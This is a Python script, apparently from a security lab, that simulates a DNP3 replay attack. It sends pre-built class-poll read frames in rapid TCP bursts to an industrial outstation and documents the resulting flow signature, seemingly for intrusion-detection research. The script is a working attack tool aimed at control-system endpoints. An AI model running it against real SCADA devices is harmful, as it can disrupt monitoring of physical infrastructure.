"""REPLAY_SIM — replay pre-built DNP3 frames in rapid bursts.

Simulates a replay attacker who has pre-captured legitimate master→outstation
frames and re-transmits them in large, fast bursts without needing real
ARP poisoning or network sniffing.

Flow signature vs NORMAL:
  Fwd Pkts/s     : very high (25 frames in ~25 ms per connection)
  Flow IAT Mean  : < 2 ms (vs ~12 ms normal steady polling)
  Flow Duration  : very short (~25–50 ms per burst connection)
  Bidirectional  : YES — outstation responds to replayed read frames
                   (reads are idempotent, so outstation honours them)

vs MITM_DOS:
  Bwd Pkt Len Mean is non-zero here (outstation replies exist)

Usage (loopback, against outstation_real.py):
  python lab/attacks/replay_sim.py --host 127.0.0.1 --duration 90

Usage (remote, against OPNsense outstation):
  python lab/attacks/replay_sim.py --host 192.168.150.34 --duration 90
"""
from __future__ import annotations
import argparse, random, socket, sys, time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from dnp3 import app_request, OBJ_CLASS0, OBJ_CLASS1, OBJ_CLASS2, OBJ_CLASS3

MASTER, OUTSTATION = 13, 2


def _build_capture() -> list[bytes]:
    """Return a pool of pre-built DNP3 read frames that simulate a legitimate
    capture.  seq rotates over [0..15] so the pool has realistic variety."""
    frames: list[bytes] = []
    for seq in range(16):
        # class-1 poll variants — most common in real captures
        frames.append(app_request(MASTER, OUTSTATION, 0x01, OBJ_CLASS1, seq=seq))
        frames.append(app_request(MASTER, OUTSTATION, 0x01,
                                  b"\x3C\x02\x07\x05", seq=seq))
        frames.append(app_request(MASTER, OUTSTATION, 0x01,
                                  OBJ_CLASS1 + OBJ_CLASS2, seq=seq))
        # periodic class-0 integrity poll
        frames.append(app_request(MASTER, OUTSTATION, 0x01, OBJ_CLASS0, seq=seq))
        # class-2 / class-3 individual polls
        frames.append(app_request(MASTER, OUTSTATION, 0x01, OBJ_CLASS2, seq=seq))
        frames.append(app_request(MASTER, OUTSTATION, 0x01, OBJ_CLASS3, seq=seq))
    return frames


_CAPTURE = _build_capture()


def _replay_burst(host: str, port: int,
                  burst_size: int, interval_within: float) -> None:
    """Open one TCP connection and blast burst_size randomly-chosen frames."""
    try:
        with socket.create_connection((host, port), timeout=3.0) as s:
            s.settimeout(0.3)
            frames = random.choices(_CAPTURE, k=burst_size)
            for frame in frames:
                s.sendall(frame)
                time.sleep(interval_within)
                try:
                    s.recv(4096)
                except socket.timeout:
                    pass
    except OSError:
        pass


def main() -> None:
    ap = argparse.ArgumentParser(
        description="DNP3 replay-attack simulator (loopback / remote)")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=20000)
    ap.add_argument("--duration", type=float, default=90.0,
                    help="total run time in seconds")
    ap.add_argument("--burst-size", type=int, default=25,
                    help="DNP3 frames per TCP connection (burst)")
    ap.add_argument("--burst-interval", type=float, default=0.001,
                    help="seconds between frames within one burst (fast = 0.001)")
    ap.add_argument("--burst-gap", type=float, default=0.8,
                    help="seconds between consecutive bursts (inter-burst pause)")
    a = ap.parse_args()

    end = time.time() + a.duration
    n_bursts = 0
    print(f"[replay_sim] -> {a.host}:{a.port}  duration={a.duration}s  "
          f"burst={a.burst_size}x{a.burst_interval*1000:.1f}ms  "
          f"gap={a.burst_gap}s", flush=True)
    while time.time() < end:
        _replay_burst(a.host, a.port, a.burst_size, a.burst_interval)
        n_bursts += 1
        gap = a.burst_gap + random.uniform(-0.3, 0.5)
        time.sleep(max(0.05, gap))
    print(f"[replay_sim] done; {n_bursts} bursts", flush=True)


if __name__ == "__main__":
    main()
